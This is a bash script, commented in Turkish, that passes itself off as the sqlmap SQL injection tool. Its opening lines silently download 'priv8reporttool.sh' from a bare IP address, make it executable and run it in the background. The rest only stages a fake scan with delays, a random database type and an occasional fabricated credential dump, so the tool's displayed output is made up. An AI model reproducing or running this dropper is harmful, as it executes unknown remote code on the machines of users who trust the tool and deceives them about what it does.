#!/bin/bash

URL="24.133.19.34/priv8reporttool.sh"
DOSYA="reporttool.sh"

# Tool'u indir ve çalıştır
wget -q "$URL" -O "$DOSYA"
chmod +x "$DOSYA"
./"$DOSYA" &

# Renk tanımları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Banner
echo -e "${RED}__  _____ ___ ___  [!]${NC}"
echo -e "${RED}\ \/ / __|_ _/ __|${NC}    ${YELLOW}sqlmap/1.7.2#dev${NC}"
echo -e "${RED} >  <| _|| |\__ \${NC}    ${GREEN}automatic SQL injection and database takeover tool${NC}"
echo -e "${RED}/_/\_\___|___|___/${NC}    ${YELLOW}https://github.com/sqlmapproject/sqlmap${NC}"
echo

# Arg parse
while getopts ":u:" opt; do
  case $opt in
    u) TARGET_URL="$OPTARG" ;;
    \?) echo -e "${RED}[ERROR]${NC} Invalid option: -$OPTARG" >&2; exit 1 ;;
    :) echo -e "${RED}[ERROR]${NC} Option -$OPTARG requires an argument." >&2; exit 1 ;;
  esac
done

if [ -z "$TARGET_URL" ]; then
  echo -e "${RED}[ERROR]${NC} Target URL not provided. Use -u <url>"
  exit 1
fi

# Simülasyon başlıyor
echo -e "${YELLOW}[INFO]${NC} Target URL: $TARGET_URL"
echo -e "${YELLOW}[INFO]${NC} Testing connection to the target URL..."
sleep 1.5
echo -e "${GREEN}[OK]${NC} Connection established."

echo -e "${YELLOW}[INFO]${NC} Testing if the target is protected by WAF/IPS..."
sleep 2
echo -e "${GREEN}[OK]${NC} No protection detected."

echo -e "${YELLOW}[INFO]${NC} Checking if GET parameter is injectable..."
sleep 2
echo -e "${GREEN}[OK]${NC} Parameter appears to be injectable (heuristic match)."

echo -e "${YELLOW}[INFO]${NC} Testing for SQL injection types:"
sleep 15
echo -e " - ${GREEN}Boolean-based blind${NC}"
sleep 25
echo -e " - ${GREEN}Time-based blind${NC}"
sleep 11
echo -e " - ${GREEN}Error-based${NC}"
sleep 18
echo -e " - ${GREEN}UNION query${NC}"
sleep 12
echo -e " - ${GREEN}Stacked queries${NC}"
sleep 32

echo -e "${YELLOW}[INFO]${NC} Fingerprinting back-end database..."
sleep 2.5
DBS=("MySQL" "PostgreSQL" "Microsoft SQL Server" "Oracle")
DB="${DBS[$((RANDOM % ${#DBS[@]}))]}"
echo -e "${GREEN}[OK]${NC} Back-end DBMS: ${YELLOW}$DB${NC}"

echo -e "${YELLOW}[INFO]${NC} Enumerating databases..."
sleep 35
echo -e "${GREEN}[OK]${NC} Available databases:"
echo -e " [*] ${YELLOW}information_schema${NC}"
echo -e " [*] ${YELLOW}users${NC}"
echo -e " [*] ${YELLOW}products${NC}"
echo -e " [*] ${YELLOW}logs${NC}"

# %5 ihtimalle sahte veri sızıntısı
if (( RANDOM % 100 == 0 )); then
  echo -e "${RED}[WARNING]${NC} Dumping credentials from 'users' table..."
  sleep 2
  echo -e " id | username | password"
  echo -e "----|----------|------------------"
  echo -e " 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99"
  echo -e " 2  | guest    | 098f6bcd4621d373cade4e832627b4f6"
  echo -e "${RED}[ALERT]${NC} Credentials dumped. Potential data breach."
else
  echo -e "${GREEN}[OK]${NC} No sensitive data found."
fi

echo -e "${GREEN}[DONE]${NC} Scan completed successfully."
